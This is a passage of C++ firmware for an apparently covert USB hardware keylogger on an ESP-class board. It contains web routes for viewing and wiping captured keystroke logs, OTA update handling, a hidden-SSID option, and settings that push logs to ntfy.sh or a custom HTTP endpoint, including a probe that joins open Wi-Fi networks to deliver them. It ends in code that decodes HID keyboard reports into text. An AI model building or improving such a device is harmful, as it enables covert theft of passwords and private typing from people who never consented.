  webServer.on("/log.txt", HTTP_GET, [](AsyncWebServerRequest *request){
    if (!requireAuth(request)) return;
    serveCombinedLog(request, true);
  });
  webServer.on("/favicon.ico", HTTP_GET, [](AsyncWebServerRequest *request){request->send_P(200, "image/png", PNG_Favicon, PNG_Favicon_Len);});
  webServer.on("/common.js", HTTP_GET, [](AsyncWebServerRequest *request){sendNoStoreProgmemGzip(request, "application/javascript; charset=utf-8", JS_Common_GZ, JS_Common_GZ_LEN);});
  webServer.on("/generate_204", HTTP_GET, [](AsyncWebServerRequest *request){sendCaptivePortalLanding(request);}); // Captive Portal on Android
  webServer.on("/fwlink", HTTP_GET, [](AsyncWebServerRequest *request){sendCaptivePortalLanding(request);}); // Captive Portal on Windows
  webServer.onNotFound([](AsyncWebServerRequest *request){
    if (!requireAuth(request)) return;
    sendMessagePage(request, "not_found", "not_found_message", "back_index", "/");
  });

  webServer.on("/clearConfirm", HTTP_GET, [](AsyncWebServerRequest *request){
    if (!requireAuth(request)) return;
    sendMessagePage(request, "clear_title", "clear_message", "yes_delete", "/clear", "no", "/");
  });
  webServer.on("/clear", HTTP_GET, [](AsyncWebServerRequest *request){
    if (!requireAuth(request)) return;
    logFile.close();
    char path[SLOT_PATH_SIZE];
    for (int slot = 1; slot < LOG_SLOT_COUNT; slot++) {
      slotPath(slot, path);
      if (LittleFS.exists(path)) LittleFS.remove(path);
    }
    if (LittleFS.exists("/keyLog.old.txt")) LittleFS.remove("/keyLog.old.txt"); // legacy
    resetRuntimePushState();
    logFile = LittleFS.open(logFile_Path, "w");
    sendMessagePage(request, "cleared_title", "cleared_message", "back_index", "/");
  });

  // /pushTest: MUST NOT call sendPushTestPayload() here — this callback runs
  // inside AsyncTCP's lwIP handler where opening a new outbound TCP socket
  // deadlocks the stack.  Instead, set pushTestPending and return immediately;
  // loop() will do the real work and set pushTestDone.
  // On the first visit we show "Testing…" + meta-refresh (3 s).
  // On the second visit (pushTestDone) we show the result and clear the flag.
  webServer.on("/pushTest", HTTP_GET, [](AsyncWebServerRequest *request){
    if (!requireAuth(request)) return;
    AsyncResponseStream *response = request->beginResponseStream("text/html; charset=utf-8");
    response->addHeader("Cache-Control", "no-store");
    printPageStart(response, "push_test");

    if (pushTestDone) {
      // ── result is ready ─────────────────────────────────────────────────
      bool ok = pushLastDeliveryOK;
      pushTestDone = false;   // consume the result
      response->print("<section class='panel'><h2 data-i18n='");
      response->print(ok ? "push_test_success" : "push_test_failed");
      response->print("'></h2><p class='hint'>");
      response->print("<span data-i18n='status'></span>: ");
      response->print(htmlEscape(pushLastResult));
      if (pushLastFailureReason.length() > 0) {
        response->print("<br><span data-i18n='reason'></span>: ");
        response->print(htmlEscape(pushLastFailureReason));
      }
      if (pushLastWifiSSID.length() > 0) {
        response->print("<br>SSID: ");
        response->print(htmlEscape(pushLastWifiSSID));
      }
      if (pushLastHttpCode != 0) {
        response->print("<br><span data-i18n='http_code'></span>: ");
        response->print(pushLastHttpCode);
      }
      response->print("</p>");
    } else {
      // ── start test (or still running) — respond immediately ─────────────
      if (!pushTestPending) {
        pushTestPending = true;   // loop() will execute the test
      }
      // Auto-refresh every 3 s until pushTestDone becomes true.
      response->print("<meta http-equiv='refresh' content='3;url=/pushTest'>"
                      "<section class='panel'>"
                      "<p class='hint' data-i18n='test_send_hint'></p>"
                      "<p class='hint' style='color:var(--muted)'>&#8987; Testing...</p>");
    }

    response->print("<div class='button-row'>"
                    "<button type='button' onclick=\"location.href='/settings'\" "
                    "data-i18n='back'></button>"
                    "</div></section>");
    printPageEnd(response);
    request->send(response);
  });

  webServer.on("/factoryResetConfirm", HTTP_GET, [](AsyncWebServerRequest *request){
    if (!bootRecoveryWindow && !requireAuth(request)) return;
    sendMessagePage(request, "factory_reset", "factory_reset_confirm", "factory_reset", "/factoryReset", "cancel", "/settings");
  });

  webServer.on("/factoryReset", HTTP_GET, [](AsyncWebServerRequest *request){
    if (!bootRecoveryWindow && !requireAuth(request)) return;
    // Full factory reset: remove config, all log slots, push state, and
    // version marker so the next boot re-initialises everything cleanly.
    logFile.close();
    if (LittleFS.exists(configFile_Path)) LittleFS.remove(configFile_Path);
    if (LittleFS.exists(versionFile_Path)) LittleFS.remove(versionFile_Path);
    if (LittleFS.exists(pushStatePath)) LittleFS.remove(pushStatePath);
    char slotBuf[SLOT_PATH_SIZE];
    for (int s = 0; s < LOG_SLOT_COUNT; s++) {
      slotPath(s, slotBuf);
      if (LittleFS.exists(slotBuf)) LittleFS.remove(slotBuf);
    }
    if (LittleFS.exists("/keyLog.old.txt")) LittleFS.remove("/keyLog.old.txt");
    clearProbeSavedSSID();
    resetRuntimePushState();
    sendMessagePage(request, "factory_reset", "factory_reset_done", "back_index", "/");
    rebootFlag = true;
  });

  // ── Settings page: tabbed (General + Push + System) ─────────────────
  webServer.on("/settings", HTTP_GET, [](AsyncWebServerRequest *request){
    if (!requireAuth(request)) return;
    if(request->hasParam("save")){
      // Validate all settings (wifi + push) in one pass
      String validationError = validateWifiSettings(request);
      if (validationError.length() == 0) {
        validationError = validatePushSettings(request);
      }
      if (validationError.length() > 0) {
        AsyncResponseStream *response = request->beginResponseStream("text/html; charset=utf-8");
        printPageStart(response, "settings");
        response->print("<section class='panel'><p style='color:var(--danger)'>");
        response->print(htmlEscape(validationError));
        response->print("</p><div class='button-row'><button type='button' onclick=\"location.href='/settings'\" data-i18n='back'></button></div></section>");
        printPageEnd(response);
        request->send(response);
        return;
      }
      // ── Save wifi / general fields ──
      cfg.AP_SSID     = normalizeConfigString(request->arg("AP_SSID"));
      cfg.AP_password = normalizeConfigString(request->arg("AP_password"));
      cfg.AP_hidssid  = normalizeConfigString(request->arg("AP_hidssid"));
      cfg.STA_SSID    = normalizeConfigString(request->arg("STA_SSID"));
      cfg.STA_password= normalizeConfigString(request->arg("STA_password"));
      cfg.tz_offset   = normalizeConfigString(request->arg("tz_offset"));
      if (cfg.tz_offset.length() == 0) cfg.tz_offset = "0";
      // ── Save push fields ──
      String oldPushMode = cfg.push_mode;
      String oldNtfyTopic = cfg.ntfy_topic;
      String oldNtfyServer = cfg.ntfy_server;
      String oldPushUrl = cfg.push_url;
      String oldPushToken = cfg.push_token;
      String oldPushKey = cfg.push_key;

      cfg.push_mode   = request->hasParam("push_mode") ? normalizeConfigString(request->arg("push_mode")) : "0";
      cfg.ntfy_topic  = normalizeConfigString(request->arg("ntfy_topic"));
      cfg.ntfy_server = forceHttpUrl(request->arg("ntfy_server"));
      if (cfg.ntfy_server.length() == 0) cfg.ntfy_server = "http://ntfy.sh";
      cfg.push_url    = forceHttpUrl(request->arg("push_url"));
      cfg.push_token  = normalizeConfigString(request->arg("push_token"));
      cfg.push_key    = normalizeConfigString(request->arg("push_key"));
      cfg.wifi_probe    = (request->arg("wifi_probe") == "1") ? "1" : "0";
      cfg.push_boot     = (request->arg("push_boot") == "1") ? "1" : "0";
      String intervalStr = request->arg("push_interval");
      intervalStr.trim();
      long intervalVal = atol(intervalStr.c_str());
      if (intervalVal < 0) intervalVal = 0;
      cfg.push_interval = String(intervalVal);
      cfg.ntp_server    = normalizeConfigString(request->arg("ntp_server"));
      if (cfg.ntp_server.length() == 0) cfg.ntp_server = "pool.ntp.org";
      cfg.web_password  = normalizeConfigString(request->arg("web_password"));
      applyGeneratedPushDefaults(currentUniqueID());
      bool pushSettingsChanged = oldPushMode != cfg.push_mode ||
                                 oldNtfyTopic != cfg.ntfy_topic ||
                                 oldNtfyServer != cfg.ntfy_server ||
                                 oldPushUrl != cfg.push_url ||
                                 oldPushToken != cfg.push_token ||
                                 oldPushKey != cfg.push_key;
      push_configured = currentPushConfigured();
      if (pushSettingsChanged) {
        if (push_configured) {
          resetPushStateForRepush();
        } else {
          resetRuntimePushState();
          pushLastResult = "Disabled";
        }
      }
      writeConfigFile();

      AsyncResponseStream *response = request->beginResponseStream("text/html; charset=utf-8");
      printPageStart(response, "settings");
      response->print("<section class='panel'><p data-i18n='config_saved'></p><div class='button-row'><button type='button' onclick=\"location.href='/'\" data-i18n='back_index'></button></div></section>");
      printPageEnd(response);
      request->send(response);
      rebootFlag = true;
    }
    else sendNoStoreProgmem(request, "text/html; charset=utf-8", HTML_Settings);
  });

  webServer.on("/reboot", HTTP_GET, [](AsyncWebServerRequest *request){
    if (!requireAuth(request)) return;
    sendMessagePage(request, "reboot", "rebooting_message", "back_index", "/");
    rebootFlag = true;
  });

  webServer.on("/syncTime", HTTP_GET, [](AsyncWebServerRequest *request){
    if (!requireAuth(request)) return;
    ntpSynced = false;
    ntpConfigured = false;
    sendMessagePage(request, "sync_time", "rebooting_message", "back_index", "/");
  });

  // Handle OTA update
  webServer.on("/update", HTTP_POST, [](AsyncWebServerRequest *request){
    if (!requireAuth(request)) return;
    AsyncResponseStream *response = request->beginResponseStream("text/html; charset=utf-8");
    printPageStart(response, "firmware");
    response->print("<section class='panel'><p>");
    if (otaSuccess && otaLastError == UPDATE_ERROR_OK) {
      response->printf("Update Success!<br>Uploaded: %u bytes<br>Rebooting...", (unsigned)otaUploaded);
      rebootFlag = true;
    } else {
      response->printf("Update fail.<br>Error code: %u<br>Written: %u bytes<br>Uploaded: %u bytes<br>Max OTA payload: %u bytes",
                       otaLastError, (unsigned)otaWritten, (unsigned)otaUploaded, (unsigned)otaMaxPayload);
    }
    response->print("</p><div class='button-row'><button type='button' onclick=\"location.href='/settings'\" data-i18n='back'></button></div></section>");
    printPageEnd(response);
    request->send(response);
  }, [](AsyncWebServerRequest *request, String filename, size_t index, uint8_t *data, size_t len, bool final){
    if (!isAuthenticated(request)) return;
    if(!index){
      otaSuccess = false;
      otaLastError = UPDATE_ERROR_OK;
      otaWritten = 0;
      otaUploaded = 0;
      otaMaxPayload = (ESP.getFreeSketchSpace() - 0x1000) & 0xFFFFF000;
      if (!Update.begin(otaMaxPayload)) {
        otaLastError = Update.getError();
        return;
      }
      Update.runAsync(true);
    }

    if (Update.hasError() || !Update.isRunning()) {
      otaLastError = Update.getError();
      return;
    }
    size_t written = Update.write(data, len);
    otaWritten += written;
    otaUploaded = index + len;
    if (written != len) {
      otaLastError = Update.getError();
      return;
    }

    if(final){
      if (Update.end(true)) {
        otaSuccess = true;
        otaLastError = UPDATE_ERROR_OK;
      } else {
        otaSuccess = false;
        otaLastError = Update.getError();
      }
    }
  });

  webServer.begin();
  dnsServer.start(53, "*", IPAddr); // Parse all DNS requests to here, used for Captive Portal
}

String formatKBytes(size_t bytes) {
  unsigned long whole = bytes / 1024UL;
  unsigned long frac = ((bytes % 1024UL) * 100UL + 512UL) / 1024UL;
  if (frac >= 100UL) {
    whole++;
    frac -= 100UL;
  }
  char temp[24];
  snprintf(temp, sizeof(temp), "%lu.%02lu KB", whole, frac);
  return String(temp);
}

// ----- HTML escape for XSS prevention -----
static String htmlEscape(const String& s) {
  String out;
  out.reserve(s.length() + 16);
  for (size_t i = 0; i < s.length(); i++) {
    char c = s[i];
    switch (c) {
      case '&':  out += "&amp;"; break;
      case '<':  out += "&lt;"; break;
      case '>':  out += "&gt;"; break;
      case '"':  out += "&quot;"; break;
      case '\'': out += "&#39;"; break;
      default:   out += c; break;
    }
  }
  return out;
}

// ----- Validate Wi-Fi / general settings -----
static String validateWifiSettings(AsyncWebServerRequest* request) {
  String ap_ssid = request->arg("AP_SSID");
  ap_ssid.trim();
  if (ap_ssid.length() == 0 || ap_ssid.length() > 32)
    return "AP SSID must be 1-32 characters";

  String ap_pass = request->arg("AP_password");
  ap_pass.trim();
  if (ap_pass.length() < 8 || ap_pass.length() > 63)
    return "AP Password must be 8-63 characters";

  String sta_ssid = request->arg("STA_SSID");
  sta_ssid.trim();
  if (sta_ssid.length() > 32)
    return "STA SSID must not exceed 32 characters";

  if (sta_ssid.length() > 0) {
    String sta_pass = request->arg("STA_password");
    sta_pass.trim();
    if (sta_pass.length() < 8 || sta_pass.length() > 63)
      return "STA Password must be 8-63 characters (WPA2 requirement)";
  }

  String tz_val = request->arg("tz_offset");
  tz_val.trim();
  if (tz_val.length() == 0) tz_val = "0";
  long tz = atol(tz_val.c_str());
  if (tz < -12 || tz > 14)
    return "Timezone offset must be between -12 and +14";

  String web_pass = request->arg("web_password");
  web_pass.trim();
  if (web_pass.length() > 0 && web_pass.length() < 4)
    return "Web password must be at least 4 characters (or empty to disable)";
  if (web_pass.length() > 64)
    return "Web password must not exceed 64 characters";

  return "";
}

// ----- Validate push settings -----
static String validatePushSettings(AsyncWebServerRequest* request) {
  String push_mode = request->arg("push_mode");
  push_mode.trim();
  if (push_mode != "0" && push_mode != "1" && push_mode != "2")
    push_mode = "0";

  String ntfy_topic = request->arg("ntfy_topic");
  ntfy_topic.trim();
  if (push_mode == "1" && ntfy_topic.length() == 0)
    return "ntfy Topic is required when push mode is ntfy.sh";
  if (ntfy_topic.length() > 128)
    return "ntfy Topic must not exceed 128 characters";

  String ntfy_server = request->arg("ntfy_server");
  ntfy_server.trim();
  if (push_mode == "1") {
    if (ntfy_server.length() == 0) ntfy_server = "http://ntfy.sh";
    if (!ntfy_server.startsWith("http://") && !ntfy_server.startsWith("https://"))
      return "ntfy Server must start with http:// (https is auto-converted to http)";
    if (ntfy_server.length() > 128)
      return "ntfy Server URL must not exceed 128 characters";
  }

  String push_url = request->arg("push_url");
  push_url.trim();
  if (push_mode == "2" && push_url.length() == 0)
    return "HTTP URL is required when push mode is Custom HTTP";
  if (push_url.length() > 0 &&
      !push_url.startsWith("http://") && !push_url.startsWith("https://"))
    return "HTTP URL must start with http:// or https://";
  if (push_url.length() > 256)
    return "HTTP URL must not exceed 256 characters";

  String push_token = request->arg("push_token");
  push_token.trim();
  if (push_token.length() > 256)
    return "Bearer Token must not exceed 256 characters";

  String push_key = request->arg("push_key");
  push_key.trim();
  if (push_key.length() > 0) {
    if (push_key.length() != 32)
      return "AES Key must be exactly 32 hex characters (128 bits)";
    for (size_t i = 0; i < 32; i++) {
      char c = push_key[i];
      if (!((c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F')))
        return "AES Key must contain only hex characters 0-9, a-f";
    }
  }

  String wifi_probe_val = request->arg("wifi_probe");
  wifi_probe_val.trim();
  if (wifi_probe_val != "0" && wifi_probe_val != "1")
    return "Open-WiFi probe must be 0 or 1";

  String push_boot_val = request->arg("push_boot");
  push_boot_val.trim();
  if (push_boot_val != "0" && push_boot_val != "1")
    return "Boot push must be 0 or 1";

  String push_interval_val = request->arg("push_interval");
  push_interval_val.trim();
  if (push_interval_val.length() == 0) push_interval_val = "0";
  long intervalInt = atol(push_interval_val.c_str());
  if (intervalInt != 0 && (intervalInt < 10 || intervalInt > 71580))
    return "Push interval must be 0 (disabled) or 10-71580 minutes";

  return "";
}





int storageUsedPercent() {
  // Cache for 500 ms so successive template variable expansions in a single
  // page render (STORAGE_USED_PERCENT + STORAGE_USED_PERCENT_TEXT) always
  // return the same value.
  static unsigned long lastAt = 0;
  static int lastPct = 0;
  unsigned long now = millis();
  if (lastAt == 0 || (now - lastAt) > 500) {
    LittleFS.info(fsInfo);
    lastAt = now;
    if (fsInfo.totalBytes == 0) { lastPct = 0; return 0; }
    int pct = (int)((fsInfo.usedBytes * 100UL) / fsInfo.totalBytes);
    if (pct < 0)   pct = 0;
    if (pct > 100) pct = 100;
    lastPct = pct;
  }
  return lastPct;
}

String retrySuffix() {
  if ((long)(millis() - nextPushAttemptAt) >= 0) return "";
  unsigned long secondsLeft = (nextPushAttemptAt - millis() + 999) / 1000;
  return "Retry in " + String(secondsLeft) + "s";
}

String pushOutcomeText() {
  if (!push_configured) return "Disabled";
  if (pushLastDeliveryOK) {
    String s = "Success";
    if (pushLastWifiSSID.length() > 0) s += " via " + htmlEscape(pushLastWifiSSID);
    return s;
  }
  if (WiFi.status() != WL_CONNECTED) return "Failed: STA disconnected";
  if (pushLastFailureReason.length() > 0) {
    String s = "Failed: " + htmlEscape(pushLastFailureReason);
    String retry = retrySuffix();
    if (retry.length() > 0) s += " - " + retry;
    return s;
  }
  return pushLastResult;
}

String pushConnectivityText() {
  if (!push_configured) return "Push platform: disabled";
  if (WiFi.status() != WL_CONNECTED) return "Push platform: waiting for STA Wi-Fi";
  if (pushLastDeliveryOK) return "Push platform: reachable via " + htmlEscape(pushLastWifiSSID);
  if (pushLastFailureReason.length() > 0) return "Push platform: " + htmlEscape(pushLastFailureReason);
  return "Push platform: not tested yet";
}

String apStatusText() {
  String s = "AP on, ";
  s += (cfg.AP_hidssid == "1") ? "SSID hidden" : "SSID visible";
  s += ", ";
  s += WiFi.softAPIP().toString();
  s += ", clients ";
  s += String(WiFi.softAPgetStationNum());
  return s;
}

String staStatusText() {
  if (!STA_configured) return "STA not configured";
  if (WiFi.status() == WL_CONNECTED) {
    String s = "STA connected, ";
    s += WiFi.localIP().toString();
    return s;
  }
  return "STA disconnected";
}

String templateProcessor(const String& var) { // Process HTML template strings
  if (var == "SPIFFSUSAGE") {
    LittleFS.info(fsInfo); // refresh on every render
    return formatKBytes(fsInfo.usedBytes) + " / " + formatKBytes(fsInfo.totalBytes);
  }
  if (var == "STORAGE_USED_PERCENT") return String(storageUsedPercent());
  if (var == "STORAGE_USED_PERCENT_TEXT") return String(storageUsedPercent()) + "%";
  if (var == "STORAGEFREE") {
    LittleFS.info(fsInfo);
    size_t freeBytes = fsInfo.totalBytes - fsInfo.usedBytes;
    return "Free " + formatKBytes(freeBytes);
  }
  if (var == "STORAGEUSED") {
    LittleFS.info(fsInfo);
    return formatKBytes(fsInfo.usedBytes) + " / " + formatKBytes(fsInfo.totalBytes);
  }
  if (var == "IPADDRESS") {
    String address;
    address.reserve(48);
    address = "AP ";
    address += WiFi.softAPIP().toString();
    if (WiFi.status() == WL_CONNECTED) {
      address += " / STA ";
      address += WiFi.localIP().toString();
    } else {
      address += " / STA offline";
    }
    return address;
  }
  if (var == "APSTATUS")        return apStatusText();
  if (var == "STASTATUS")       return staStatusText();
  if (var == "PUSHCONNECTIVITY") return pushConnectivityText();
  if (var == "AP_SSID")         return htmlEscape(cfg.AP_SSID);
  if (var == "AP_password")         return htmlEscape(cfg.AP_password);
  if (var == "SHOWSSID")        return (cfg.AP_hidssid == "1") ? "" : "checked";
  if (var == "HIDSSID")         return (cfg.AP_hidssid == "1") ? "checked" : "";
  if (var == "STA_SSID")         return htmlEscape(cfg.STA_SSID);
  if (var == "STA_password")         return htmlEscape(cfg.STA_password);
  if (var == "NTFY_TOPIC")         return htmlEscape(cfg.ntfy_topic);
  if (var == "NTFY_SERVER")         return htmlEscape(cfg.ntfy_server);
  if (var == "PUSH_URL")         return htmlEscape(cfg.push_url);
  if (var == "PUSH_TOKEN")         return htmlEscape(cfg.push_token);
  if (var == "PUSH_KEY") {
    if (applyGeneratedPushDefaults(currentUniqueID())) writeConfigFile();
    return htmlEscape(cfg.push_key);
  }
  if (var == "PUSH_OFF")        return (cfg.push_mode == "0") ? "checked" : "";
  if (var == "PUSH_NTFY")       return (cfg.push_mode == "1") ? "checked" : "";
  if (var == "PUSH_HTTP")       return (cfg.push_mode == "2") ? "checked" : "";
  if (var == "WIFI_PROBE_OFF")  return (cfg.wifi_probe == "1") ? "" : "checked";
  if (var == "WIFI_PROBE_ON")   return (cfg.wifi_probe == "1") ? "checked" : "";
  if (var == "TZ_OFFSET")       return htmlEscape(cfg.tz_offset);
  if (var == "PUSH_BOOT_OFF")   return (cfg.push_boot == "1") ? "" : "checked";
  if (var == "PUSH_BOOT_ON")    return (cfg.push_boot == "1") ? "checked" : "";
  if (var == "PUSH_INTERVAL")   return htmlEscape(cfg.push_interval);
  if (var == "NTP_SERVER")      return htmlEscape(cfg.ntp_server);
  if (var == "WEB_PASSWORD")    return htmlEscape(cfg.web_password);
  if (var == "SYSTEMTIME") {
    time_t now = time(nullptr);
    if (now < 1577836800UL) return "--";
    time_t local = now + tzOffsetSeconds();
    struct tm t;
    gmtime_r(&local, &t);
    char tz[16]; tzLabel(tz, sizeof(tz));
    char buf[40];
    snprintf(buf, sizeof(buf), "%04d-%02d-%02d %02d:%02d:%02d %s",
             t.tm_year+1900, t.tm_mon+1, t.tm_mday,
             t.tm_hour, t.tm_min, t.tm_sec, tz);
    return String(buf);
  }
  if (var == "NTP_STATUS") return ntpSynced ? "<span data-i18n='ntp_synced'></span>" : "<span data-i18n='ntp_not_synced'></span>";
  if (var == "WIFI_SIGNAL") {
    if (WiFi.status() != WL_CONNECTED) return "STA offline";
    int rssi = WiFi.RSSI();
    return htmlEscape(WiFi.SSID()) + " (" + String(rssi) + " dBm)";
  }
  if (var == "AP_INFO") {
    String s = htmlEscape(cfg.AP_SSID) + " / " + WiFi.softAPIP().toString();
    s += " / " + String(WiFi.softAPgetStationNum()) + " clients";
    return s;
  }
  if (var == "STA_INFO") {
    if (!STA_configured) return "Not configured";
    if (WiFi.status() != WL_CONNECTED)
      return htmlEscape(cfg.STA_SSID) + " / offline";
    return htmlEscape(WiFi.SSID()) + " / " + WiFi.localIP().toString() + " / " + String(WiFi.RSSI()) + " dBm";
  }
  if (var == "UPTIME") {
    unsigned long s = millis() / 1000;
    unsigned long d = s / 86400; s %= 86400;
    unsigned long h = s / 3600;  s %= 3600;
    unsigned long m = s / 60;    s %= 60;
    char buf[32];
    if (d > 0) snprintf(buf, sizeof(buf), "%lud %luh %lum", d, h, m);
    else if (h > 0) snprintf(buf, sizeof(buf), "%luh %lum %lus", h, m, s);
    else snprintf(buf, sizeof(buf), "%lum %lus", m, s);
    return String(buf);
  }
  if (var == "NEXT_PUSH") {
    if (!push_configured) return "--";
    if (pushPending) return "<span data-i18n='push_boot'></span>...";
    int intervalMin = atoi(cfg.push_interval.c_str());
    if (intervalMin <= 0) return "--";
    unsigned long elapsed = millis() - lastScheduledPushAt;
    unsigned long intervalMs = (unsigned long)intervalMin * 60000UL;
    if (elapsed >= intervalMs) return "0s";
    unsigned long left = (intervalMs - elapsed) / 1000;
    unsigned long lm = left / 60; left %= 60;
    char buf[16];
    if (lm > 0) snprintf(buf, sizeof(buf), "%lum %lus", lm, left);
    else snprintf(buf, sizeof(buf), "%lus", left);
    return String(buf);
  }
  if (var == "AP_CLIENTS") return String(WiFi.softAPgetStationNum());
  if (var == "IPADDRESS_AP") return WiFi.softAPIP().toString();
  if (var == "STA_IP") {
    if (WiFi.status() != WL_CONNECTED) return "offline";
    return WiFi.localIP().toString();
  }
  if (var == "NTFY_FULL_URL") {
    if (cfg.ntfy_topic.length() > 0 && cfg.ntfy_server.length() > 0) {
      String url = cfg.ntfy_server;
      if (!url.endsWith("/")) url += "/";
      url += cfg.ntfy_topic;
      return htmlEscape(url);
    }
    return "";
  }
  if (var == "PUSHSTATUS") {
    if (pushLastDeliveryOK) {
      String s = "<span data-i18n='push_success_to'></span> ";
      String url;
      if (cfg.push_mode == "1" && cfg.ntfy_server.length() > 0 && cfg.ntfy_topic.length() > 0) {
        url = cfg.ntfy_server;
        if (!url.endsWith("/")) url += "/";
        url += cfg.ntfy_topic;
      } else if (cfg.push_mode == "2" && cfg.push_url.length() > 0) {
        url = cfg.push_url;
      }
      if (url.length() > 0 && (url.startsWith("http://") || url.startsWith("https://"))) {
        s += "<a href='" + htmlEscape(url) + "' target='_blank' style='color:inherit;text-decoration:underline'>";
        s += htmlEscape(url) + "</a>";
      } else {
        s += htmlEscape(pushModeName());
      }
      return s;
    }
    return htmlEscape(pushModeName() + ": " + pushOutcomeText());
  }
  if (var == "FIRMWAREVERSION")  return String(Version);
  if (var == "PROBE_STATUS")  {
    if (probePhase == PROBE_SCANNING)   return "<span data-i18n='probe_scanning'></span>";
    if (probePhase == PROBE_CONNECTING || probePhase == PROBE_SAVED_TRY)
      return "<span data-i18n='probe_connecting'></span>";
    return "";
  }
  return "";  // unknown variable → empty string (never show raw var name)
}

/*
Compare two sets of HID data and output new keystrokes in ASCII form.

HIDData_old: Keyboard data from the previous input
HIDData:     8-byte keyboard HID data, e.g., 0x00,0x00,0x04,0x0c,0x03,0x06,0x28,0x49
capslock:    Caps lock status
result:      char* to receive return value
resultSize:  sizeof(result) buffer; appends are bounds-checked
*/
#define GET_BIT(byte2process, bit_pos)  ((byte2process & (1 << bit_pos)) >> bit_pos)

// HID code 0x1E..0x27 -> "1234567890" / "!@#$%^&*()"
static const char NUM_NORMAL[] = "1234567890";
static const char NUM_SHIFT[]  = "!@#$%^&*()";

// HID code 0x2D..0x38 punctuation map (normal, shifted)
struct PunctMap { char normal; char shifted; };
static const PunctMap PUNCT[] = {
  {'-', '_'},  // 0x2D
  {'=', '+'},  // 0x2E
  {'[', '{'},  // 0x2F
  {']', '}'},  // 0x30
  {'\\','|'},  // 0x31
  {'#', '~'},  // 0x32  Non-US #/~  (was duplicated with 0x35; fixed)
  {';', ':'},  // 0x33
  {'\'','"'},  // 0x34
  {'`', '~'},  // 0x35
  {',', '<'},  // 0x36
  {'.', '>'},  // 0x37
  {'/', '?'},  // 0x38
};

// HID code 0x54..0x63 keypad characters. Index = code - 0x54.
// 0x58 = numpad Enter, handled separately as "[Enter]\n".
static const char KEYPAD[16] = {
  '/', '*', '-', '+',                                        // 0x54..0x57
  0,                                                          // 0x58 Enter (special)
  '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '.'      // 0x59..0x63
};

static inline void appendStr(char* dst, size_t cap, const char* src) {
  size_t dlen = strlen(dst);
  size_t slen = strlen(src);
  // All-or-nothing: only write if the whole string fits, preventing truncated
  // key names (e.g. "[Lef" instead of "[Left]") from appearing in the log.
  if (dlen + slen + 1 > cap) return;
  memcpy(dst + dlen, src, slen + 1);  // includes null terminator
}

static inline void appendChar(char* dst, size_t cap, char c) {
  size_t dlen = strlen(dst);
  if (dlen + 1 >= cap) return;
  dst[dlen] = c;
  dst[dlen + 1] = '\0';
}

static inline bool hidReportHasKey(const uint8_t* report, uint8_t code) {
  for (int i = 2; i < 8; i++) {
    if (report[i] == code) return true;
  }
  return false;
}

static inline bool hidCtrlDown(const uint8_t* report) {
  return GET_BIT(report[0], 0) || GET_BIT(report[0], 4);
}

static inline bool hidShiftDown(const uint8_t* report) {
  return GET_BIT(report[0], 1) || GET_BIT(report[0], 5);
}

static inline bool hidAltDown(const uint8_t* report) {
  return GET_BIT(report[0], 2) || GET_BIT(report[0], 6);
}

static inline bool hidWinDown(const uint8_t* report) {
  return GET_BIT(report[0], 3) || GET_BIT(report[0], 7);
}

static inline bool hidModifierByteLooksValid(uint8_t modifiers) {
  // Bits 0..7 are exactly the eight standard USB HID keyboard modifiers.
  // This helper is mostly documentary, but keeps report validation explicit.
  (void)modifiers;
  return true;
}

static inline bool isHidKeyboardErrorCode(uint8_t code) {
  return code >= 0x01 && code <= 0x03; // ErrorRollOver / POSTFail / ErrorUndefined
}

static inline bool isKnownHidKeyCode(uint8_t code) {
  return code == 0x00 ||
         (code >= 0x04 && code <= 0x38) ||
         (code >= 0x39 && code <= 0x53) ||
         (code >= 0x54 && code <= 0x63);
}

bool hidReportLooksValid(const uint8_t* report) {
  if (!hidModifierByteLooksValid(report[0])) return false;
  if (report[1] != 0x00) return false; // reserved byte should stay zero

  // Keyboard error codes (ErrorRollOver / POSTFail / ErrorUndefined) in any
  // keycode slot mean the entire report is unreliable — reject the frame.
  // Unknown (non-standard) keycodes are tolerated; HID2ASCII simply ignores
  // them so the rest of the report (known keys + modifiers) is not lost.
  for (int i = 2; i < 8; i++) {
    uint8_t code = report[i];
    if (code == 0x00) continue;
    if (isHidKeyboardErrorCode(code)) return false;
    // Check for duplicate keycodes (invalid HID report)
    for (int j = i + 1; j < 8; j++) {
      if (report[j] != 0x00 && report[j] == code) return false;
    }
  }
  return true;
}

// Special / non-printable keys (0x28..0x53). Returns nullptr if not in table.
static const char* specialKeyName(uint8_t code) {
  switch (code) {
    case 0x28: return "[Enter]\n";
    case 0x29: return "[Esc]";
    case 0x2A: return "[Backsp]";
    case 0x2B: return "[Tab]";
    case 0x39: return "[Capslock]";
    case 0x3A: return "[F1]";
    case 0x3B: return "[F2]";
    case 0x3C: return "[F3]";
    case 0x3D: return "[F4]";
    case 0x3E: return "[F5]";
    case 0x3F: return "[F6]";
    case 0x40: return "[F7]";
    case 0x41: return "[F8]";
    case 0x42: return "[F9]";
    case 0x43: return "[F10]";
    case 0x44: return "[F11]";
    case 0x45: return "[F12]";
    case 0x46: return "[PrintScreen]";
    case 0x47: return "[ScrollLock]";
    case 0x48: return "[Pause]";
    case 0x49: return "[Ins]";
    case 0x4A: return "[Home]";
    case 0x4B: return "[PageUp]";
    case 0x4C: return "[Del]";
    case 0x4D: return "[End]";
    case 0x4E: return "[PageDown]";
    case 0x4F: return "[Right]";
    case 0x50: return "[Left]";
    case 0x51: return "[Down]";
    case 0x52: return "[Up]";
    case 0x53: return "[NumLock]";
    default:   return nullptr;
  }
}

static const char* shortcutSpecialName(uint8_t code) {
  switch (code) {
    case 0x28: return "Enter";
    case 0x29: return "Esc";
    case 0x2A: return "Backsp";
    case 0x2B: return "Tab";
    case 0x39: return "Capslock";
    case 0x3A: return "F1";
    case 0x3B: return "F2";
    case 0x3C: return "F3";
    case 0x3D: return "F4";
    case 0x3E: return "F5";
    case 0x3F: return "F6";
    case 0x40: return "F7";
    case 0x41: return "F8";
    case 0x42: return "F9";
    case 0x43: return "F10";
    case 0x44: return "F11";
    case 0x45: return "F12";
    case 0x4F: return "Right";
    case 0x50: return "Left";
    case 0x51: return "Down";
    case 0x52: return "Up";
    default:   return nullptr;
  }
}

void appendShortcutKey(char* dst, size_t cap, const uint8_t* report, uint8_t code) {
  char keyName[12] = "";
  if (code >= 0x04 && code <= 0x1D) {
    keyName[0] = (char)('a' + (code - 0x04));
    keyName[1] = '\0';
  } else if (code >= 0x1E && code <= 0x27) {
